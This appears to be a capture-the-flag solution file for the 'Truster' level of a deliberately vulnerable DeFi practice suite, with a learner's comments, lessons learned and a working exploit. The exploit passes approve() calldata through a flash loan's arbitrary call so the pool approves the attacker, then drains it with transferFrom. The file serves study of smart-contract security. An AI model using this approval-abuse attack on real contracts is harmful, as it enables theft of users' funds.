const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        // Ok definitely looks like we wanna be writing our own smart contract to request a flash loan from the provider

        // The borrower address (who recieves the DVT flashloaned tokens) and the tager address (who executes the arbitrary code)
        // do not have to be the same in this flash loan lender... interesting 

        // Hmm that last require statement looks like a tough one
        // `require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");`
        // It's literally requiring the balance to remain or the function will revert, and the function has a reentrancy guard on it
        // One thing I'm thinking is, I can provide a contract to run arbitrary code - this code could reenter in itself somehow?

        // Also need to check out the low level `functionCall` function that's being used
        // https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-
        // It is basically just `#call` - a low level way to call a function, if it reverts then the revert & reason is bubbled up

        // The lines:
        // damnValuableToken.transfer(borrower, borrowAmount);
        // target.functionCall(data);
        // are slightly odd... this must be what I need to pry into with my own SC

        // Ooooooh interesting. This answer: https://ethereum.stackexchange.com/a/8636
        // mentions that using low-level functions such as #call might prevent the whole "revert everything" that Solidity does upon a throw

        // Oh also, from this answer: https://ethereum.stackexchange.com/a/8654
        // "If C calls D.foo(), and foo does a throw, then yes the entire transaction is reverted.
        // If C does a "lower-level raw call" like D.call(bytes4(sha3('foo()'))), and foo does a throw, then only foo and its subcalls are reverted. 
        // This is because a raw call does not propagate any exceptions: a raw call like D.call only returns a boolean which indicates if the call 
        // succeeded or encountered an exception."

        // Hmmm, although does using #functionCall from OpenZeppelin negate this? 
        // Since it seems reverts bubble up (calling `target` with `data` must not revert), ie. it would only be exploitable if using #call directly

        // Surely we need to halt execution somehow? There's no other way around the 2 require checks and reentrancy is guarded
        // What if I added an extra step in the chain? So using .call I can get a revert that only reverts the function it is called inside
        // and if needed I can add a 'layer of insulation' by calling this from another intermediate contract 
        // LenderPool -> AttackerInsulateContract -> AttackerThrowingContract

        // Ahhhhhh wait. I don't think we can halt execution of the flashLoan() function, so that 2nd require is always gonna fire and the pool 
        // must contain the same number of DVT tokens afterwards. There is no way around that we cannot siphon them directly
        // However, since we we could potentially do arbitrary code execution within the function, could we possibly give ourselves approval to 
        // the TrusterPool's DVT tokens to be able to go and siphon the tokens ourselves afterwards?

        // So this works because of the context - msg.sender is the Pool contract when that arbitrary function call is executed!
        // Apparently approval abuse hacks are prevelant in the wild, eg. Bancor: https://zengo.com/bancor-smart-contracts-vulnerability-its-not-over/
        // Jesus this one was tricky! Going to an external 'attacker contract' was possible (but not required/appropriate in this case), however this
        // pattern could be used for the Pool contract to execute any function anywhere as msg.sender, we could have got them to do anything!!!

        // SOLUTION ===========================================================

        const poolSize = await this.token.balanceOf(this.pool.address);
       
        // Had to look this up - apparently this is how you ABI Encode a function call in Ethers
        let ABI = [ "function approve(address spender, uint value)" ];
        let iface = new ethers.utils.Interface(ABI);
        let payload = iface.encodeFunctionData("approve", [ attacker.address, poolSize ]) 

        const attackTx = await this.pool.connect(attacker).flashLoan(
            0,
            attacker.address,
            this.token.address,
            payload
        );

        const transferTx = await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, poolSize);

        // LESSONS LEARNED
        // - Use OpenZeppelin's #callFunction rather than Solidity's lowlevel #call directly
        // - It's dangerous to allow arbitrary code execution from anyone, in this case anyone could supply an ABI Encoded function call and a 
        // target address to call that on and the Pool contract would run it _crucially, with itself as context_
        // It all hinged on the fact that msg.sender during that arbitrary code execution step within the flashloan would be the Pool Contract, 
        // not the wallet that requested the flashloan!
        // - Keep a very close eye on who will be msg.sender in chained function calls, always keep the context in mind and how that could be abused

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

